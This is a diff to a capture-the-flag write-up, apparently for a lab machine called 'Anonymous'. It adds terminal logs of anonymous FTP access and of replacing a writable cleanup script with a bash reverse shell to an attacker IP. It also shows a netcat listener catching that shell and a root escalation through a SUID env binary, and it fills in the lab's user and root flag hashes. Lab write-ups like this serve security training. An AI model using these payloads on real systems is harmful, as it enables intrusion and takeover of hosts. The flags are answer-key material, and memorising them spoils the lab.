@@ -208,7 +208,158 @@ Reconnecting with SMB1 for workgroup listing.
 <br>
            
 > 1.5. <em>user.txt</em><br><a id='1.5'></a>
->> <code><strong>_____</strong></code>
+>> <code><strong>90d6f992585815ff991e68748c414740</strong></code>
+
+<br>
+
+<pre><code>root@ip-[Attack_Box]:~/anonymous# ftp 10.10.150.106
+Connected to 10.10.150.106.
+220 NamelessOne's FTP Server!
+Name (10.10.150.106:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
+226 Directory send OK.
+ftp> cd scripts
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
+-rw-rw-r--    1 1000     1000         1634 Nov 11 03:39 removed_files.log
+-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
+226 Directory send OK.
+ftp> get to_do.txt
+local: to_do.txt remote: to_do.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for to_do.txt (68 bytes).
+226 Transfer complete.
+68 bytes received in 0.05 secs (1.2484 kB/s)
+ftp> get removed_files.log
+local: removed_files.log remote: removed_files.log
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for removed_files.log (1677 bytes).
+226 Transfer complete.
+1677 bytes received in 0.00 secs (25.7954 MB/s)
+ftp> get clean.sh
+local: clean.sh remote: clean.sh
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for clean.sh (314 bytes).
+226 Transfer complete.
+314 bytes received in 0.00 secs (5.2536 MB/s)
+ftp> exit
+221 Goodbye.
+</code></pre>
+
+<br>
+
+<pre><code>root@ip-[Attack_Box]:~/anonymous# ls
+clean.sh  removed_files.log  to_do.txt
+</code></pre>
+
+<br>
+
+<pre><code>root@ip-[Attack_Box]:~/anonymous# cat to_do.txt
+I really need to disable the anonymous login...it's really not safe
+</code></pre>
+
+<br>
+
+<pre><code>root@ip-[Attack_Box]:~/anonymous# cat removed_files.log
+unning cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+...
+Running cleanup script:  nothing to delete
+</code></pre>
+
+<br>
+
+<pre><code>root@ip-[Attack_Box]:~/anonymous# at clean.sh
+#!/bin/bash
+
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
+else
+    for LINE in $tmp_files; do
+        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
+fi
+</code></pre>
+
+<br>
+
+<p>Let´s used the following payload replacing <code>clean.sh</code></p>
+
+![image](https://github.com/user-attachments/assets/2da1926c-1ba3-4fc4-9239-5ff2e97df430)
+
+<pre><code>
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.29.125/4444 0>&1
+</code></pre>
+
+<br>
+
+<pre><code>root@[Attack_Box]:~/anonymous# nc -nvlp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+</code></pre>
+
+<br>
+
+<pre><code>oot@ip-[Attack_Box]:~/anonymous# ftp 10.10.150.106
+Connected to [Target].
+220 NamelessOne's FTP Server!
+Name (10.10.150.106:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
+226 Directory send OK.
+ftp> cd scripts
+250 Directory successfully changed.
+ftp> put clean.sh
+local: clean.sh remote: clean.sh
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+55 bytes sent in 0.00 secs (1.3113 MB/s)
+ftp> 
+</code></pre>
+
+<br>
+
+<pre><code>oot@ip-[Attack_Box]:~/anonymous# nc -nvlp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from [Target] 34812 received!
+bash: cannot set terminal process group (1522): Inappropriate ioctl for device
+bash: no job control in this shell
+namelessone@anonymous:~$ ls
+ls
+pics
+user.txt
+namelessone@anonymous:~$ cat user.txt
+cat user.txt
+90d6f992585815ff991e68748c414740
+namelessone@anonymous:~$ 
+</code></pre>
 
 <br>
 
@@ -216,6 +367,37 @@ Reconnecting with SMB1 for workgroup listing.
 >> <code><strong>_____</strong></code>
 
 <br>
+
+<pre><code>namelessone@anonymous:~$ sudo -l
+udo -l
+sudo: no tty present and no askpass program specified
+namelessone@anonymous:~$ find / -user root -perm -u=s 2>/dev/null
+find / -user root -perm -u=s 2>/dev/null
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+...
+/usr/bin/passwd
+/usr/bin/env
+...
+namelessone@anonymous:~$ env /bin/sh -p
+env /bin/sh -p
+whoami
+root
+ls 
+pics
+user.txt
+cd root
+/bin/sh: 3: cd: can't cd to root
+cat /root/root.txt
+4d930091c31a622a7ed10f27999af363
+</code></pre>
+
   
 
 
